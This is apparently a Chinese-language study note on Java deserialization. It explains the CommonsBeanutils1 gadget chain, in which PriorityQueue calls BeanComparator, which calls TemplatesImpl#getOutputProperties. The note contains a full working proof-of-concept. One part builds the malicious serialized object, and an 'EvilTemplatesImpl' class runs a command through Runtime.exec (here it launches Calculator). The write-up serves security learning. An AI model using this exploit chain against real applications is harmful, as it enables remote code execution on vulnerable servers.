# 反序列化基础篇-CommonsBeanutils
# 0x00 前言

在 [反序列化基础篇-Commons-Collections4.0 下的 CC2 和 CC4](https://github.com/reidmu/sec-note/blob/main/Java-sec/Commons-Collections4.0%E4%B8%8B%E7%9A%84CC2%E5%92%8CCC4.md#0x03-priorityqueue%E5%88%A9%E9%93%BE) 中，我们学习了优先队列 `java.util.PriorityQueue`。

`PriorityQueue` 队列中每个元素都有自己的优先级，在反序列化 `PriorityQueue` 对象时，需要保证这个队列结构的顺序，为了进行这个排序，自然会进行大小比较，所以我们会执行 `java.util.Comparator` 接口的 `compare()` 方法来完成这个大小比较。

实际上，在 `commons-collections` 中找 `Gadget` 的过程，实际上可以简化为，找⼀条从 `Serializable#readObject()` ⽅法到 `Transformer#transform()` ⽅法的调⽤链。

`TransformingComparator#compare()` 中就有调用到 `Transformer#transform()` ⽅法。

所以 `CommonsCollections2` 实际就是⼀条从 `PriorityQueue#readObject()` 到 `TransformingComparator#compare()` 再到 `Transformer#transform()` 的利⽤链。

那么，除了 `TransformingComparator` 以外，还有没有其它能够造成反序列化攻击的 `java.util.Comparator` 实现类呢？

答：有，它就是 `org.apache.commons.beanutils.BeanComparator` 。

# 0x01 Apache Commons Beanutils

`Apache Commons` 工具集下除了 `Apache Commons Collections` 以外还有 `Apache Commons Beanutils` ，它提供了对普通Java类对象（也称为 `JavaBean` ）的一些操作方法。

## 1.1 JavaBean 是什么？

可以看看[这篇文章](https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680) ，小小总结下就是：

如果一个 `class` 拥有属性 `xyz`，并且拥有对应的 `setter` 和 `getter` 方法，那么这种 `class` 被称为 `JavaBean`。

如果是 `boolean` 类型的属性，那比较特殊，它的读方法一般命名为 `isXyz()`。

举个🌰：

`Person` 是个简单的 `JavaBean` ：

```java
public class Person {
    private String name;

    public String getName() {
      System.out.println("调用了 getName");
      return this.name; 
    }
  
    public void setName(String name) {
      this.name = name; 
    }
}
```

`Person` 类包含一个私有属性 `name` ，还有读取和设置这个属性的两个方法，又称为 `getter` 和 `setter` 。其中，`getter` 的方法名以 `get` 开头，`setter` 的方法名以 `set` 开头，全名符合骆驼式命名法（`Camel-Case`）。

## 1.2 PropertyUtils.getProperty
`commons-beanutils` 中提供了一个静态方法 `PropertyUtils.getProperty` ，让使用者可以直接调用任意 `JavaBean` 的 `getter` 方法，比如：

```java
PropertyUtils.getProperty(new Person(), "name");
```

这个方法会自动调用目标类 `Person` 的属性 `name` 的 `getter` 方法，也就是 `Person` 类中的 `getName` 方法，输出结果如下:

<div align=center><img width="486" src="https://github.com/reidmu/sec-note/assets/84888757/464e2731-bae0-41d0-835b-779f4b0fe4fa" /></div>

除此之外，`PropertyUtils.getProperty` 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 `PropertyUtils.getProperty(a, "b.c");` 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的 `getter`，适用于在不确定 `JavaBean` 是哪个类对象时使用。

`commons-beanutils` 中诸如此类的辅助方法还有很多，如调用 `setter` 、拷贝属性等，这里暂时就不细说了。

## 1.3 commons-beanutils 和 TemplatesImpl

我们的目标是再找到一个能够造成反序列化攻击的 `java.util.Comparator` 实现类，在 `commons-beanutils` 包中就存在一个：`org.apache.commons.beanutils.BeanComparator` 。

`BeanComparator` 是 `commons-beanutils` 提供的用来比较两个 `JavaBean` 是否相等的类，其实现了 `java.util.Comparator` 接口。我们需要注意的是它的 `compare` 方法，因为其中用到了 `PropertyUtils.getProperty`，让我们可以尝试调用 `getter` 方法从而执行任意代码：

<div align=center><img width="813" src="https://github.com/reidmu/sec-note/assets/84888757/666f7a70-1c66-4c29-bfe2-0242c590ad0f" /></div>

这个方法传入两个对象，如果 `this.property` 为空，则直接比较这两个对象；如果 `this.property` 不为空，则用 `PropertyUtils.getProperty` 分别取这两个对象的 `this.property` 属性，比较属性的值。

在1.2章节中，我们了解到 `PropertyUtils.getProperty` 这个方法会自动去调用一个 `JavaBean` 的 `getter` 方法，这个点是任意代码执行的关键。有没有什么 `getter` 方法可以执行恶意代码呢？

我们在学习CC3的时候，提到过可以执行任意代码的 [TemplatesImpl](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC3.md#222-templatesimplnewtransformer)


在 `TemplatesImpl` 中有如下的链：

```java
TemplatesImpl#getOutputProperties() -> 
    TemplatesImpl#newTransformer() ->
        TemplatesImpl#getTransletInstance() -> 
            TemplatesImpl#defineTransletClasses() -> 
                TemplatesImpl$TransletClassLoader#defineClass() ->
                  恶意类初始化
```

`TemplatesImpl#getOutputProperties()` 方法就是个 `getter` 方法，经过后续一系列调用，可以执行恶意字节码。

`BeanComparator#compare()` 方法中的 `PropertyUtils.getProperty( o1, property )` ，当 `o1` 是一个 `TemplatesImpl` 对象，而 `property` 的值为 `outputProperties` 时，将会自动调用 `getter` ，也就是 `TemplatesImpl#getOutputProperties()` 方法，触发代码执行。

所以利用链变成了：

```java
ObjectInputSream#readObject()
  --> PriorityQueue#readObject()
    --> PriorityQueue#heapify()
      --> PriorityQueue#siftDown()
        --> PriorityQueue#siftDownUsingComparator()
          --> BeanComparator#compare()
            --> TemplatesImpl#getOutputProperties()
              --> TemplatesImpl#newTransformer()
                --> TemplatesImpl#getTransletInstance()
                  --> TemplatesImpl#defineTransletClasses()
                    --> TemplatesImpl$TransletClassLoader#defineClass()
                      --> 恶意类初始化
```


# 0x02 环境搭建

📒 pom.xml

```xml
<dependency>
    <groupId>commons-beanutils</groupId>
    <artifactId>commons-beanutils</artifactId>
    <version>1.8.3</version>
</dependency>
```

# 0x03 反序列化利用链构造
## 3.1 创建TemplateImpl

```java
TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj, "_bytecodes", new byte[][]{
    // 恶意类字节码
    ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
});
setFieldValue(obj, "_name", "xxx");
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
```

## 3.2 实例化 `BeanComparator` 

`BeanComparator` 构造函数为空时，默认的 `property` 就是空：

```java
final BeanComparator beancomparator = new BeanComparator();
```
## 3.3 用这个 `beancomparator` 实例化优先队列 `PriorityQueue`

```java
final PriorityQueue<Object> priorityqueue = new PriorityQueue<Object>(2, beancomparator);
// stub data for replacement later
priorityqueue.add(1);
priorityqueue.add(1);
```

这里我们先添加了两个无害的可以比较的对象进队列中。

前文说过，`BeanComparator#compare()`中，如果this.property为空，则直接比较这两个对象。这里实际上就是对两个1进行排序。

初始化时使用正经对象，且 `property` 为空，这一系列操作是为了初始化的时候不要出错。

## 3.4 我们再用反射将 `beancomparator` 的 `property` 的值设置成恶意的 `outputProperties` ，将队列里的两个1替换成恶意的 `TemplateImpl` 对象：

```java
// 将comparator的property修改，使其在compare方法中去执行getOutputProperties
setFieldValue(beancomparator, "property", "outputProperties");
setFieldValue(priorityqueue, "queue", new Object[]{obj, obj});
```

## 3.5 完整 CommonsBeanutils poc

📒 CommonsBeanutils1.java

```java
package org.vulhub.Ser;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // 创建TemplateImpl
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "xxx");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        //实例化本篇讲的BeanComparator。BeanComparator构造函数为空时，默认的property就是空
        final BeanComparator beancomparator = new BeanComparator();
        //然后用这个comparator实例化优先队列PriorityQueue：
        final PriorityQueue<Object> priorityqueue = new PriorityQueue<Object>(2, beancomparator);
        // stub data for replacement later
        priorityqueue.add(1);
        priorityqueue.add(1);

        // 将comparator的property修改，使其在compare方法中去执行getOutputProperties
        setFieldValue(beancomparator, "property", "outputProperties");
        setFieldValue(priorityqueue, "queue", new Object[]{obj, obj});

        // 序列化, 保存为文件
//        serialize(queue);
        // 反序列化，从文件中读取上面一步序列化的数据
        unserialize("ser_CB183.bin");

    }

    public static void serialize(Object queue) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CB183.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(queue);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

📒 evil.EvilTemplatesImpl.java

```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    static {
        System.out.println("Hello TemplatesImpl static block");
    }

    public static void main(String[] args) {

        System.out.println("Hello TemplatesImpl main method");
    }
    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl Construction method");
        Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    }

}
```

<img width="1214" alt="image" src="https://github.com/reidmu/sec-note/assets/84888757/74dd4762-c9de-4375-90a0-027066527dd6">

# 0x04 参考链接
- [CommonsBeanutils与无commons-collections的Shiro反序列化利用](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html#)










